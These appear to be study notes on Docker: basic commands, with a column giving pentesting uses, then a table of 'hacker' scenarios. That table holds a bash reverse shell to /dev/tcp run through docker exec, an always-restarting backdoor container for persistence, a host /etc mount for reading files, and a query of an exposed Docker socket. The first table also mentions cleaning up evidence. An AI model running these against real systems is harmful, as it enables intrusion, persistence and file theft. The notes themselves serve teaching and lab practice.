
# Container 

 A **Container** is a **lightweight, standalone, and executable environment** that includes everything needed to run a piece of software—**code, libraries, system tools, and settings**—packaged together.

# Docker 

 **Docker** is a platform that uses **containerization technology** to package applications and their dependencies into a standardized unit called a **container**, which can run reliably in any computing environment.

##  Key Concepts:

- **Container**: A lightweight, standalone, executable package that includes everything needed to run a piece of software (code, runtime, libraries, environment variables, etc.).
    
- **Docker Image**: A read-only template used to create containers. It includes the application and all dependencies.
    
- **Docker Engine**: The runtime that builds and runs Docker containers.
    
- **Dockerfile**: A script with instructions to build a Docker image.
    
- **Docker Hub**: A cloud-based registry where Docker users can share and store images.
-

## Docker Basic Commands with Definitions and Uses
| **Command**                         | **Definition**                                                | **Usage**                                         | **Hacking/Pentesting Use**                                           |
| ----------------------------------- | ------------------------------------------------------------- | ------------------------------------------------- | -------------------------------------------------------------------- |
| `docker --version`                  | Shows Docker version installed.                               | `docker --version`                                | Verify Docker is installed before using for attacks/labs.            |
| `docker pull <image>`               | Downloads an image from Docker Hub.                           | `docker pull kalilinux/kali-linux-docker`         | Pull Kali Linux or vulnerable app images for pentesting.             |
| `docker images`                     | Lists downloaded Docker images.                               | `docker images`                                   | Check if tools like metasploit, kali, dvwa are available.            |
| `docker ps`                         | Lists running containers.                                     | `docker ps`                                       | Monitor active attack containers or see if a target is using Docker. |
| `docker ps -a`                      | Lists all containers (running + stopped).                     | `docker ps -a`                                    | Useful to see previously deployed malware or persistence.            |
| `docker run <image>`                | Starts a container from an image.                             | `docker run kalilinux/kali-linux-docker`          | Spin up a Kali container with tools like Nmap, sqlmap, etc.          |
| `docker run -it <image>`            | Runs a container interactively with terminal.                 | `docker run -it kalilinux/kali-linux-docker bash` | Get shell inside container for testing tools/exploits.               |
| `docker exec -it <container> <cmd>` | Executes a command in a running container.                    | `docker exec -it mykali bash`                     | Re-enter a container shell or run payload inside a container.        |
| `docker stop <container>`           | Stops a running container.                                    | `docker stop mykali`                              | Kill reverse shell container or halt an attack simulation.           |
| `docker start <container>`          | Restarts a stopped container.                                 | `docker start mykali`                             | Resume an old persistent backdoor container.                         |
| `docker rm <container>`             | Removes a container.                                          | `docker rm mykali`                                | Clean up evidence or destroy infected containers.                    |
| `docker rmi <image>`                | Removes an image.                                             | `docker rmi kalilinux/kali-linux-docker`          | Remove attack image to reduce footprint.                             |
| `docker build -t <name> .`          | Builds image from Dockerfile.                                 | `docker build -t mytool .`                        | Create custom image with malware/tools preinstalled.                 |
| `docker logs <container>`           | Shows logs of a container.                                    | `docker logs dvwa`                                | View web traffic or login attempts in vulnerable apps.               |
| `docker network ls`                 | Lists Docker networks.                                        | `docker network ls`                               | Discover internal container networks used for pivoting.              |
| `docker inspect <container>`        | Shows low-level info.                                         | `docker inspect dvwa`                             | Get internal IP, mounts, or ports of a vulnerable app.               |
| `docker volume ls`                  | Lists all Docker volumes.                                     | `docker volume ls`                                | Check for data persistence or credentials stored.                    |
| `docker-compose up`                 | Starts multiple containers defined in a `docker-compose.yml`. | `docker-compose up`                               | Launch full vulnerable environments (e.g., DVWA + DB).               |
| `docker-compose down`               | Stops and removes containers/networks defined in compose.     | `docker-compose down`                             | Cleanup after training/lab setup.                                    |

## Real-World Hacker Uses with Docker:

| **Scenario**               | **Command**                                                                   | **What Happens**                                          |
| -------------------------- | ----------------------------------------------------------------------------- | --------------------------------------------------------- |
| 🔧 Setup Pentest Lab       | `docker run -d -p 80:80 vulnerables/web-dvwa`                                 | Launch DVWA vulnerable app in seconds.                    |
| 🧪 Test Exploit Safely     | `docker run -it kalilinux/kali-linux-docker`                                  | Run exploit tools in an isolated environment.             |
| 👣 Hide Persistence        | `docker run -d --restart always attacker/backdoor`                            | Backdoor persists after reboot using Docker auto-restart. |
| 📡 Launch Reverse Shell    | `docker exec -it <target> bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'`         | Run reverse shell from inside the container.              |
| 📤 Data Exfiltration       | Mount host volume to steal files. `docker run -v /etc:/mnt alpine ls /mnt`    | Access host's `/etc/passwd` from inside container.        |
| 🚪 Exploit Open Docker API | `curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json` | See running containers if Docker socket is exposed.       |
|                            |                                                                               |                                                           |




